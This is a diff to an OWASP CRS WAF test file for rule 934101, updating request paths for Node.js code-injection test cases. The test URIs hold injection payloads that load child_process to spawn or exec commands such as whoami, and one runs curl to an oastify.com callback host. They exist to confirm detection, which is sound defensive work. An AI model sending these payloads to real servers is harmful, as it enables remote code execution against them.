@@ -1,6 +1,6 @@
 ---
 meta:
-  author: "rekter0"
+  author: "rekter0, azurit"
   enabled: true
   name: "934101.yaml"
   description: "Tests for rule 934101"
@@ -17,7 +17,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: /?foo=%23%7Brequire.main.constructor._load%28child_process%29.spawn%28%27foo%27%2C%5B%27bar%27%2C%27bar%27%5D%29%7D
+            uri: "/get?foo=%23%7Brequire.main.constructor._load%28child_process%29.spawn%28%27foo%27%2C%5B%27bar%27%2C%27bar%27%5D%29%7D"
             version: HTTP/1.0
           output:
             log_contains: id "934101"
@@ -33,7 +33,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: /?foo=%23%7Brequire.main.constructor._load%28%27fs%27%29.write%28fd%2C%20str%2C%200%2C%20null%2C%20%7B%7D%29%7D
+            uri: "/get?foo=%23%7Brequire.main.constructor._load%28%27fs%27%29.write%28fd%2C%20str%2C%200%2C%20null%2C%20%7B%7D%29%7D"
             version: HTTP/1.0
           output:
             log_contains: id "934101"
@@ -49,7 +49,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: /?foo=%23%7Brequire.main.constructor._load%28%27child_process%27%29.fork%28%22binary%22%2C%20%5B%22bar%22%5D%2C%20%7B%7D%29%7D
+            uri: "/get?foo=%23%7Brequire.main.constructor._load%28%27child_process%27%29.fork%28%22binary%22%2C%20%5B%22bar%22%5D%2C%20%7B%7D%29%7D"
             version: HTTP/1.0
           output:
             log_contains: id "934101"
@@ -65,7 +65,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: /?foo=require("child_process").exec('whoami')
+            uri: "/get?foo=require(\"child_process\").exec('whoami')"
             version: HTTP/1.0
           output:
             log_contains: id "934101"
@@ -81,7 +81,7 @@ tests:
               User-Agent: "OWASP CRS test agent"
             method: GET
             port: 80
-            uri: /rce/lol%3drequire%3bx%3d"child_process"%3blol(x).spawn('curl',+['5gmgdi7mjd5o3g8oj8gawq6n8ee5ht6.oastify.com'])%3b
+            uri: "/get/rce/lol%3drequire%3bx%3d\"child_process\"%3blol(x).spawn('curl',+['5gmgdi7mjd5o3g8oj8gawq6n8ee5ht6.oastify.com'])%3b"
             version: HTTP/1.0
           output:
             log_contains: id "934101"
